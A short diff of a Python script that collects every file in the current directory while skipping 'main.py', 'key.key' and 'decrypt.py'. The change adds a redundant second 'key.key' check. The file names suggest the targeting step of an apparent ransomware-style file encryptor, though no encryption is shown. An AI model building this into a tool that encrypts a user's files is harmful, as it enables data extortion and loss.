@@ -3,7 +3,7 @@ import os
 files = []
 
 for file in os.listdir():
-  if file == 'main.py' or file == 'key.key' or file == 'decrypt.py':
+  if file == 'main.py' or file == 'key.key' or file == 'decrypt.py' or file == 'key.key':
     continue
   if os.path.isfile(file):
     files.append(file)
